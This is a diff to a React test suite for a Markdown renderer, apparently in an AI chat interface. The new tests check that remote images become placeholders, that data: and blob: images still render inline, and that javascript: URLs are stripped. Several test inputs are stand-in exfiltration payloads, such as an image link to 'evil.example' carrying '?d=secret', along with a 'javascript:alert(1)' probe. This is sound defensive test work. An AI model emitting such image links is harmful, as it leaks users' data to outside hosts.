@@ -218,16 +218,22 @@ describe('Markdown', () => {
   });
 
   it('renders markdown images unchanged', () => {
-    render(<Markdown content="![alt text](https://example.com/pic.png)" />);
+    render(<Markdown content="![alt text](data:image/png;base64,AAAA)" />);
     const img = screen.getByRole('img', { name: 'alt text' });
-    expect(img).toHaveAttribute('src', 'https://example.com/pic.png');
+    expect(img).toHaveAttribute('src', 'data:image/png;base64,AAAA');
+  });
+
+  it('renders a placeholder instead of a live img for remote markdown images', () => {
+    render(<Markdown content="![alt text](https://example.com/pic.png)" />);
+    expect(screen.getByTestId('aui-remote-image-placeholder')).toBeInTheDocument();
+    expect(screen.queryByRole('img')).not.toBeInTheDocument();
   });
 
   it('renders reference-style links and images unchanged', () => {
     render(
       <Markdown
         content={
-          '[link][ref]\n\n![alt][imgref]\n\n[ref]: https://example.com/page "a title"\n[imgref]: https://example.com/pic.png'
+          '[link][ref]\n\n![alt][imgref]\n\n[ref]: https://example.com/page "a title"\n[imgref]: data:image/png;base64,AAAA'
         }
       />,
     );
@@ -235,7 +241,7 @@ describe('Markdown', () => {
     expect(link).toHaveAttribute('href', 'https://example.com/page');
     expect(link).toHaveAttribute('title', 'a title');
     const img = screen.getByRole('img', { name: 'alt' });
-    expect(img).toHaveAttribute('src', 'https://example.com/pic.png');
+    expect(img).toHaveAttribute('src', 'data:image/png;base64,AAAA');
   });
 
   it('renders \\[ \\] display math as KaTeX', () => {
@@ -356,5 +362,95 @@ describe('Markdown', () => {
     render(<Markdown content={content} citationSources={sources} />);
     // The marker in fenced code should be preserved unchanged
     expect(screen.getByText(/Code【14†ignored】/)).toBeInTheDocument();
+  });
+});
+
+describe('Markdown remote images', () => {
+  it('renders a placeholder instead of a live img for a markdown https image', () => {
+    render(<Markdown content="![chart](https://evil.example/p.png?d=secret)" />);
+    expect(screen.getByTestId('aui-remote-image-placeholder')).toBeInTheDocument();
+    expect(document.querySelector('img')).not.toBeInTheDocument();
+  });
+
+  it('renders a placeholder for a raw <img> tag with a remote src', () => {
+    render(<Markdown content={'<img src="https://evil.example/p.png" alt="pic" />'} />);
+    expect(screen.getByTestId('aui-remote-image-placeholder')).toBeInTheDocument();
+    expect(document.querySelector('img')).not.toBeInTheDocument();
+  });
+
+  it('renders a placeholder for an http:// image', () => {
+    render(<Markdown content="![x](http://evil.example/p.png)" />);
+    expect(screen.getByTestId('aui-remote-image-placeholder')).toBeInTheDocument();
+    expect(document.querySelector('img')).not.toBeInTheDocument();
+  });
+
+  it('renders a placeholder for a protocol-relative image', () => {
+    render(<Markdown content="![x](//evil.example/p.png)" />);
+    expect(screen.getByTestId('aui-remote-image-placeholder')).toBeInTheDocument();
+    expect(document.querySelector('img')).not.toBeInTheDocument();
+  });
+
+  it('shows the destination host and alt text on the placeholder', () => {
+    render(<Markdown content="![sales chart](https://evil.example/p.png)" />);
+    const placeholder = screen.getByTestId('aui-remote-image-placeholder');
+    expect(placeholder).toHaveTextContent('evil.example');
+    expect(placeholder).toHaveTextContent('sales chart');
+  });
+
+  it('opens the remote image in a new tab when the placeholder is activated', () => {
+    render(<Markdown content="![x](https://evil.example/p.png)" />);
+    const placeholder = screen.getByTestId('aui-remote-image-placeholder');
+    expect(placeholder).toHaveAttribute('href', 'https://evil.example/p.png');
+    expect(placeholder).toHaveAttribute('target', '_blank');
+    expect(placeholder).toHaveAttribute('rel', 'noopener noreferrer');
+  });
+
+  it('still renders data: images inline', () => {
+    render(<Markdown content="![x](data:image/png;base64,AAAA)" />);
+    const img = document.querySelector('img');
+    expect(img).toBeInTheDocument();
+    expect(img).toHaveAttribute('src', 'data:image/png;base64,AAAA');
+    expect(screen.queryByTestId('aui-remote-image-placeholder')).not.toBeInTheDocument();
+  });
+
+  it('still renders same-origin images inline', () => {
+    render(<Markdown content="![x](/assets/pic.png)" />);
+    const img = document.querySelector('img');
+    expect(img).toBeInTheDocument();
+    expect(img).toHaveAttribute('src', '/assets/pic.png');
+    expect(screen.queryByTestId('aui-remote-image-placeholder')).not.toBeInTheDocument();
+  });
+
+  it('still renders blob: images inline', () => {
+    render(<Markdown content="![x](blob:https://example.com/1234)" />);
+    const img = document.querySelector('img');
+    expect(img).toBeInTheDocument();
+    expect(img).toHaveAttribute('src', 'blob:https://example.com/1234');
+    expect(screen.queryByTestId('aui-remote-image-placeholder')).not.toBeInTheDocument();
+  });
+
+  it('renders nothing for an image with an empty src', () => {
+    const { container } = render(<Markdown content="![x]()" />);
+    expect(container.querySelector('img')).not.toBeInTheDocument();
+    expect(screen.queryByTestId('aui-remote-image-placeholder')).not.toBeInTheDocument();
+  });
+});
+
+describe('markdownUrlTransform', () => {
+  it('keeps data: and blob: URLs', async () => {
+    const { markdownUrlTransform } = await import('@/atoms/Markdown.js');
+    expect(markdownUrlTransform('data:image/png;base64,AAAA')).toBe('data:image/png;base64,AAAA');
+    expect(markdownUrlTransform('blob:https://example.com/1234')).toBe('blob:https://example.com/1234');
+  });
+
+  it('keeps http, https and relative URLs', async () => {
+    const { markdownUrlTransform } = await import('@/atoms/Markdown.js');
+    expect(markdownUrlTransform('https://example.com/p.png')).toBe('https://example.com/p.png');
+    expect(markdownUrlTransform('/assets/pic.png')).toBe('/assets/pic.png');
+  });
+
+  it('strips javascript: URLs', async () => {
+    const { markdownUrlTransform } = await import('@/atoms/Markdown.js');
+    expect(markdownUrlTransform('javascript:alert(1)')).toBe('');
   });
 });
